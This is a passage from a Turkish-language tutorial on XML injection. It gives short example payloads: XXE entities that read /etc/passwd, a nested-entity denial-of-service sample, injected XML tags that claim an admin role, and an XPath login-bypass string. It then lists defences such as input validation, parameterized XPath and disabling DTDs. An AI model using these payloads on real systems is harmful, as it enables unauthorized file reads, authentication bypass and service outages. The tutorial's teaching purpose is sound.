<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

Bu, `etc/passwd` dosyasının içeriğini saldırgana sunabilir.

### 3. **XML Injection ile DoS (Denial of Service) Saldırıları**

XML Injection, aşırı büyük XML dosyaları veya özyinelemeli varlıklar ile DoS saldırıları gerçekleştirmek için kullanılabilir.

#### Örnek:

Bir XML dosyası, birçok iç içe geçmiş varlık içerebilir:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bomb [
  <!ENTITY repeat "Ha! ">
  <!ENTITY bomb "&repeat;&repeat;&repeat;&repeat;&repeat;&repeat;&repeat;&repeat;&repeat;">
]>
<bomb>&bomb;</bomb>
```

Bu tür bir saldırı, sunucunun kaynaklarını tüketebilir ve hizmetin durmasına neden olabilir.

---

## XML Injection Örnekleri

### Örnek 1: Basit XML Enjeksiyonu

Bir uygulama, kullanıcıdan alınan bilgileri XML formatında saklıyor olabilir:

```php
$name = $_POST['name'];
$email = $_POST['email'];

$xml = "<user><name>$name</name><email>$email</email></user>";
```

Saldırgan, `name` alanına aşağıdaki gibi bir giriş yaparak XML yapısını değiştirebilir:

```xml
<name>John Doe</name><role>admin</role>
```

Bu giriş, XML yapısını şu şekilde manipüle eder:

```xml
<user>
    <name>John Doe</name>
    <role>admin</role>
    <email>johndoe@example.com</email>
</user>
```

Bu durumda, saldırgan kendisini admin rolünde gösterebilir.

### Örnek 2: XPath Enjeksiyonu

Bir uygulama, kullanıcıdan alınan kullanıcı adı ve parola ile XML veritabanını sorguluyor olabilir:

```php
$query = "//user[username/text()='$username' and password/text()='$password']";
```

Saldırgan, aşağıdaki girdiyi sağlayabilir:

```
' or '1'='1
```

Bu, XPath sorgusunu her zaman true dönecek şekilde manipüle eder.

### Örnek 3: XXE Saldırısı

Bir uygulama, XML dosyalarını işliyor ve dış varlıkları kabul ediyor olabilir:

```php
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>
```

Bu saldırı, sunucunun dosya sistemine yetkisiz erişim sağlamasına olanak tanır.

---

## XML Injection Korunma Yöntemleri

### 1. **Girdi Doğrulama ve Temizleme**

- **Whitelist Kullanımı:** Kullanıcıdan gelen girdileri yalnızca izin verilen karakterlerle kabul edin. XML özel karakterlerini (örneğin `<`, `>`, `&`) uygun şekilde işleyin.
  
- **Regex Kullanımı:** Girdileri doğrulamak için düzenli ifadeler kullanarak sadece beklenen formatta veri kabul edin.

### 2. **Parametreli Sorgular**

- **Parametreli XPath Kullanımı:** XPath sorgularını oluştururken kullanıcı girdilerini doğrudan eklemek yerine parametreli sorgular kullanarak güvenli hale getirin.

### 3. **Dış Varlıkları Devre Dışı Bırakma (XXE Korunma)**

- **XXE Korunma:** XML işlemcilerini yapılandırarak dış varlıkların kullanımını devre dışı bırakın. Örneğin, Java'da:

  ```java
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  ```

### 4. **DoS Saldırılarına Karşı Önlemler**

- **Boyut ve Karmaşıklık Kontrolü:** XML dosyalarının boyutunu ve karmaşıklığını sınırlayın. Örneğin, özyinelemeli varlıklar ve aşırı büyük dosyalar için kontroller ekleyin.

### 5. **Güvenli Kodlama Pratikleri**

- **Güvenli Kodlama Standartları:** Uygulama geliştiricileri, güvenli kodlama standartlarını benimsemeli ve güvenlik açıklarına karşı düzenli eğitim almalıdır.

### 6. **Düzenli Güvenlik Testleri**

- **Penetrasyon Testleri:** Uygulamaların güvenliğini düzenli olarak değerlendirmek için güvenlik testleri ve penetrasyon testleri gerçekleştirin.

---
